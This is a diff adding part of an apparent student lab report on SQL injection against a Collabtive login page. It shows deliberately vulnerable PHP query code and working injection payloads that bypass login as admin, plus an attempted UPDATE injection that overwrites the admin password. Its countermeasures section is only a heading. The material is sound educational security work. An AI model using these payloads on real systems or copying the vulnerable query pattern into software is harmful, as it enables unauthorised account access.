@@ -1,0 +1,119 @@
+\subsection{Context} \label{l4_ctx}
+SQL injection is very similar to the format string vulnerability in that the user's input is mistakenly interpreted as code. In this case, data submitted by the user of a website is directly inserted into a string literal as the fields of an SQL statement, exposing it to malicious manipulation.
+
+For a much oversimplified example, suppose a user attempts to sign into a website using a login form that results in two variables: \emph{\$usr} and \emph{\$pwd}. The user could enter any string of characters into the login form and the strings would be faithfully passed to the server's php script. Before SQL injection was widely known, the php script might look like the following:
+
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={Vulnerable SQL statement construction},
+label={lst:l4_ctx_vulnstm},
+frame=single]
+...
+$queryFindUser = "SELECT ID FROM users " .
+                 "WHERE username = '$usr'" .
+                 "AND password = '$pwd'";
+$sqlResult = mysql_query($queryFindUser);
+$resultArray = mysql_fetch_array($sqlResult);
+
+//check login success
+if ($resultArray["ID"] != "")
+...
+\end{lstlisting}
+\end{minipage}
+
+A way to login as any user would be to manipulate one of the form fields to be part of a valid SQL statement, for instance:
+
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={Malicious login strings passed from the login form},
+label={lst:l4_ctx_hackpwd},
+frame=single]
+$usr = "admin";
+$pwd = "' OR '1'='1";
+\end{lstlisting}
+\end{minipage}
+
+When inserted into the query, the \emph{\$queryFindUser} string expands to:
+
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={Vulnerable SQL statement expansion},
+label={lst:l4_ctx_hackquery},
+frame=single]
+"SELECT ID FROM users
+WHERE username = 'admin'
+AND password = '' OR '1' == '1'"
+\end{lstlisting}
+\end{minipage}
+
+The above query in fact asks the database to "find the user ID whose username is 'admin' and \emph{either} (1) their password is empty \emph{or} (2) one is equal to one". Obviously one is always equal to one, so the query simply logs the user in as admin without the password check. This is a simple example of an SQL injection - data from the user being interpreted as part of a valid SQL statement, resulting in unpredicted and often malicious behaviour. SQL injections can also be used to gain confidential information from the database, or to find another vulnerability to attack. In reality, there are several obstacles when executing such attack. More on realistic circumstances and defences will be discussed in Task 3 and the following reflective report.
+
+In Tasks 1 and 2, the \emph{magic\_quotes\_gpc} option is turned off in the php.ini file for illustration purposes. This prevents php from automatically escaping character sequences in variables received from website forms. In this lab we focus on the file /var/www/SQL/Collabtive/include/class.user.php, which is responsible for querying the database and checking the password when a user attempts a login.
+
+\subsection{Task 1 - Injection on the login form}
+\subsubsection{Part 1 - Bypassing hashed password}
+In this subtask, the submitted password string is first hashed using SHA-1 (see code in \lstref{lst:l4_t1p1_vulnstm}). This means the attack given in Section \ref{l4_ctx} would fail. The resultant query string of the same attack is shown in \lstref{lst:l4_t1p1_failatk}, which shows a string of gibberish that is just data for the query.
+
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={Vulnerable SQL login statement},
+label={lst:l4_t1p1_vulnstm},
+frame=single]
+...
+$pass = sha1($pass);
+$sel1 = mysql_query("SELECT ID,name,locale,lastlogin,gender
+                    FROM user WHERE (name = '$user' OR
+                    email = '$user') AND pass = '$pass'");
+$chk = mysql_fetch_array($sel1);
+if ($chk["ID"] != "")
+...
+\end{lstlisting}
+\end{minipage}
+
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={Failed SQL injection due to hash},
+label={lst:l4_t1p1_failatk},
+frame=single]
+"SELECT ID,name,locale,lastlogin,gender
+FROM user WHERE (name = 'admin' OR email = 'admin')
+AND pass = '6db581bfaa81c33a2b9af4355950ae2bfcc18384'"
+\end{lstlisting}
+\end{minipage}
+
+There is no way to bypass the password hash, so we turn our attention to the username field, which is enclosed by single quotes. Since \emph{magic\_quotes\_gpc} is turned off, we have an opportunity to exploit a different SQL manipulation:
+
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={Username injection input},
+label={lst:l4_t1p1_usratk},
+frame=single]
+$user = "admin' ); #"
+\end{lstlisting}
+\end{minipage}
+
+The input string in \lstref{lst:l4_t1p1_usratk} expands into \lstref{lst:l4_t1p1_usratkres}, which essentially tells the database server to just look for the user with name 'admin', and ignore the rest of the query (using the \# character). This grants us access to the admin access to the website.
+
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={Username injection expansion},
+label={lst:l4_t1p1_usratkres},
+frame=single]
+"SELECT ID,name,locale,lastlogin,gender
+FROM user WHERE (name = 'admin' ); #'
+OR email = 'admin' ); #')
+AND pass = 'da39a3ee5e6b4b0d3255bfef95601890afd80709'"
+\end{lstlisting}
+\end{minipage}
+
+\subsubsection{Part 2 - Attempt to overwrite data}
+To take this attack further, we try to set the admin password (i.e. overwrite data) using the username field using a multi-statement injection such as \lstref{lst:l4_t1p2_owtry}.
+
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={Overwrite injection attempt},
+label={lst:l4_t1p2_owtry},
+frame=single]
+$user = "admin' ); UPDATE user
+SET pass = 'c6dda4f283c9e13682ea3aef2e1732dd80b63cbc'
+WHERE name = 'admin'; #"
+\end{lstlisting}
+\end{minipage}
+
+This fails, because the php script calls \emph{mysql\_query()}, which executes only the first query. However, if the php script had called \emph{mysqli::multi\_query}, then the same attack could work.
+
+\subsection{Task 2 - Injection on UPDATE}
+
+\subsection{Task 3 - Countermeasures}
